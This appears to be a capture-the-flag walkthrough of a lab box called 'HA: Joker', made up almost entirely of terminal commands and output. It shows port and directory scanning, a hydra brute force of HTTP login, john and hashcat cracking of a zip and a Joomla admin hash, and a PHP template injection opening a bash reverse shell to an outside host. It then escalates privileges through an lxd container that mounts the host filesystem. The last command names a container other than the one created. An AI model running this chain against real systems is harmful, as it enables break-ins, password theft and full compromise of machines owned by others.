```
oot@kali:~# nmap -sV -sC -T5 10.10.168.24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-20 14:19 UTC
Nmap scan report for ip-10-10-168-24.eu-west-1.compute.internal (10.10.168.24)
Host is up (0.0013s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
8080/tcp open  http    Apache httpd 2.4.29
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
MAC Address: 02:67:62:BE:E4:00 (Unknown)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.87 seconds
root@kali:~#
```


```
root@kali:~# gobuster dir -u http://10.10.168.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,xml,txt,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.168.24
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,xml,txt,html
[+] Timeout:        10s
===============================================================
2020/07/20 14:23:41 Starting gobuster
===============================================================
/index.html (Status: 200)
/img (Status: 301)
/css (Status: 301)
/secret.txt (Status: 200)
/phpinfo.php (Status: 200)
===============================================================
2020/07/20 14:24:52 Finished
===============================================================
root@kali:~#
```


```
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```

```
root@kali:~# hydra -l joker -P /usr/share/wordlists/rockyou.txt 10.10.168.24 -s 8080 http-get
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-20 14:31:46
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.168.24:8080/
[8080][http-get] host: 10.10.168.24   login: joker   password: hannah
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-20 14:32:13
root@kali:~#
```


```
root@kali:~# gobuster dir -u http://10.10.168.24:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -U joker -P hannah -x txt,php,html,zip
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.168.24:8080
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Auth User:      joker
[+] Extensions:     html,zip,txt,php
[+] Timeout:        10s
===============================================================
2020/07/20 14:40:58 Starting gobuster
===============================================================
/media (Status: 301)
/templates (Status: 301)
/index.php (Status: 200)
/modules (Status: 301)
/images (Status: 301)
/bin (Status: 301)
/plugins (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/README (Status: 200)
/README.txt (Status: 200)
/components (Status: 301)
/cache (Status: 301)
/libraries (Status: 301)
/backup (Status: 200)
/backup.zip (Status: 200)
/robots (Status: 200)
/robots.txt (Status: 200)
/LICENSE (Status: 200)
/LICENSE.txt (Status: 200)
/tmp (Status: 301)
/layouts (Status: 301)
/administrator (Status: 301)
/configuration.php (Status: 200)
/htaccess (Status: 200)
/htaccess.txt (Status: 200)
/cli (Status: 301)
```





```
root@kali:~/Downloads# ls
backup.zip  hash.txt
root@kali:~/Downloads# john hash.txt /usr/share/wordlists/rockyou.txt


^^^^^^^^^^^^^^^^^^^^^^^

Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
hannah           (backup.zip)
1g 0:00:00:00 DONE 2/3 (2020-07-20 14:49) 14.28g/s 1147Kp/s 1147Kc/s 1147KC/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~/Downloads#
```


- joomladb.sql
```
/*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */;
INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;
UNLOCK TABLES;
```


```
root@kali:~# hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz, 1024/2953 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=6 -D KERN_TYPE=3200 -D _unroll'
* Device #1: Kernel m03200-pure.2ca65036.kernel not found in cache! Building may take a while...
* Device #1: Kernel amp_a0.0d337653.kernel not found in cache! Building may take a while...
Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (23.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 67106869 bytes (47.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 134213744 bytes (95.Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Type........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj...unOcbG
Time.Started.....: Mon Jul 20 15:12:19 2020 (28 secs)
Time.Estimated...: Tue Jul 28 14:06:57 2020 (7 days, 22 hours)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       21 H/s (5.61ms) @ Accel:4 Loops:2 Thr:8 Vec:8
Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 576/14344385 (0.00%)
Rejected.........: 0/576 (0.00%)
Restore.Point....: 576/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:338-340
Candidates.#1....: evelyn -> pebbles

$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG:abcd1234

Session..........: hashcat
Status...........: Cracked
Hash.Type........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj...unOcbG
Time.Started.....: Mon Jul 20 15:12:19 2020 (48 secs)
Time.Estimated...: Mon Jul 20 15:13:07 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       21 H/s (5.72ms) @ Accel:4 Loops:2 Thr:8 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 1024/14344385 (0.01%)
Rejected.........: 0/1024 (0.00%)
Restore.Point....: 960/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1022-1024
Candidates.#1....: marie1 -> bethany
```


- http://10.10.78.96:8080/administrator/index.php?option=com_templates&view=template&id=503&file=L2luZGV4LnBocA%3D%3D
```
exec("/bin/bash -c 'bash -i > /dev/tcp/<IPADDR>/1234 0>&1'");
```


```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
joker:x:1000:1000:joker,,,:/home/joker:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
mysql:x:107:114:MySQL Server,,,:/nonexistent:/bin/false
lxd:x:108:65534::/var/lib/lxd/:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
guid
cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,joker
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:joker
floppy:x:25:
tape:x:26:
sudo:x:27:joker
audio:x:29:
dip:x:30:joker
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:joker
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
input:x:104:
crontab:x:105:
syslog:x:106:
messagebus:x:107:
mlocate:x:108:
uuidd:x:109:
ssh:x:110:
joker:x:1000:
lpadmin:x:111:joker
sambashare:x:112:joker
ssl-cert:x:113:
mysql:x:114:
lxd:x:115:joker,www-data
```

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/opt/joomla$
```

```
www-data@ubuntu:/opt/joomla$ lxc image ls
lxc image ls
+----------+--------------+--------+------------------------------------+--------+--------+------------------------------+
|  ALIAS   | FINGERPRINT  | PUBLIC |            DESCRIPTION             |  ARCH  |  SIZE  |         UPLOAD DATE          |
+----------+--------------+--------+------------------------------------+--------+--------+------------------------------+
| myalpine | a8258f4a885f | no     | Alpine 3.10 amd64 (20191025_13:00) | x86_64 | 2.39MB | Oct 25, 2019 at 8:07pm (UTC) |
+----------+--------------+--------+------------------------------------+--------+--------+------------------------------+
```

```
$ lxc init myalpine joker -c security.privileged=true
$ lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true
$ lxc start joker
$ lxc exec ignite /bin/sh
```
